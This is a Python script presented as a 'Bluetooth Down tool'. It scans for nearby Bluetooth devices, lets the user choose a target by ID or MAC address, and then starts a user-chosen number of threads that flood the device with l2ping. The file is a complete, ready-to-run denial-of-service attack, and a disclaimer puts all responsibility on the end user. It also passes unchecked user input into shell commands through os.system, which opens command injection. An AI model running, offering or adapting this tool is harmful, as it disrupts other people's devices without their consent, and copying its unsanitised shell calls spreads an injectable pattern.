import os

import threading

import time

import subprocess



def DOS(target_addr, packages_size, interval):

    try:

        while True:

            # Using `os.system` is simple but doesn't give us much control over errors; let's wrap it in a try-except

            result = os.system(f'l2ping -i hci0 -s {packages_size} -f {target_addr}')

            if result != 0:

                print(f"[!] Error: l2ping failed for {target_addr} with code {result}")

                break

            time.sleep(interval)

    except Exception as e:

        print(f"[!] DOS thread error: {e}")



def printLogo():

    print('                             Bluetooth Down tool by SHR                          ')



def main():

    printLogo()

    time.sleep(0.1)

    print('')

    print('\x1b[31mTHIS SOFTWARE IS PROVIDED "AS IS" WITHOUT WARRANTY OF ANY KIND. YOU MAY USE THIS SOFTWARE AT YOUR OWN RISK. THE USE IS COMPLETE RESPONSIBILITY OF THE END-USER.')

    

    agreement = input("Do you agree? (y/n) > ").strip().lower()

    if agreement not in ['y', 'yes']:

        print('User did not agree. Exiting.')

        exit(0)

    

    os.system('clear')

    printLogo()

    print('')

    

    # Check if 'hcitool' command is available

    if subprocess.call("command -v hcitool", shell=True) != 0:

        print("[!] ERROR: 'hcitool' is not installed or not available in your system path.")

        exit(1)



    print("Scanning for Bluetooth devices...")

    try:

        output = subprocess.check_output("hcitool scan", shell=True, stderr=subprocess.STDOUT, text=True)

    except subprocess.CalledProcessError as e:

        print(f"[!] ERROR: Failed to scan for Bluetooth devices: {e}")

        exit(1)

    

    lines = output.splitlines()

    if len(lines) <= 1:

        print("[!] No Bluetooth devices found.")

        exit(1)



    del lines[0]  # Remove the header line

    array = []

    print("|id   |   mac_address  |   device_name|")

    

    for id, line in enumerate(lines):

        info = line.split()

        mac = info[0]

        device_name = ' '.join(info[1:]) if len(info) > 1 else "Unknown"

        array.append(mac)

        print(f"|{id}   |   {mac}  |   {device_name}|")

    

    # Get target device

    target_id_or_mac = input('Target id or MAC address > ').strip()

    

    if target_id_or_mac.isdigit():

        try:

            target_addr = array[int(target_id_or_mac)]

        except IndexError:

            print(f"[!] ERROR: Invalid ID. No device found with ID {target_id_or_mac}")

            exit(1)

    else:

        # Assume the user entered a MAC address directly

        target_addr = target_id_or_mac

    

    if len(target_addr) < 1:

        print('[!] ERROR: Target address is missing')

        exit(0)



    # Get package size

    try:

        packages_size = int(input('Package size (recommended: 600-1000) > '))

    except ValueError:

        print('[!] ERROR: Package size must be an integer')

        exit(0)

    

    # Get number of threads

    try:

        threads_count = int(input('Number of threads > '))

    except ValueError:

        print('[!] ERROR: Threads count must be an integer')

        exit(0)

    

    # Get interval between packets

    try:

        interval = float(input('Interval between packets (seconds) > '))

        if interval < 0:

            raise ValueError

    except ValueError:

        print('[!] ERROR: Interval must be a positive float (e.g., 0.01 for faster attacks)')

        exit(0)



    os.system('clear')

    print("\x1b[31m[*] Starting enhanced DOS attack in 3 seconds...")



    for i in range(3, 0, -1):

        print(f"[*] {i}")

        time.sleep(1)

    

    os.system('clear')

    print('[*] Building threads...\n')



    # Build threads

    try:

        threads = []

        for i in range(threads_count):

            print(f'[*] Built thread №{i + 1}')

            thread = threading.Thread(target=DOS, args=(target_addr, packages_size, interval))

            threads.append(thread)

            thread.start()

        

        print('[*] Built all threads...')

        print('[*] Starting DOS attack...')

        

        # Keep the main thread alive

        for thread in threads:

            thread.join()  # Wait for all threads to finish

    except Exception as e:

        print(f"[!] ERROR: Could not start threads: {e}")

        exit(1)



if __name__ == '__main__':

    try:

        os.system('clear')

        main()

    except KeyboardInterrupt:

        print('\n[*] Aborted by user.')

        exit(0)

    except Exception as e:

        print(f'[!] ERROR: {e}')

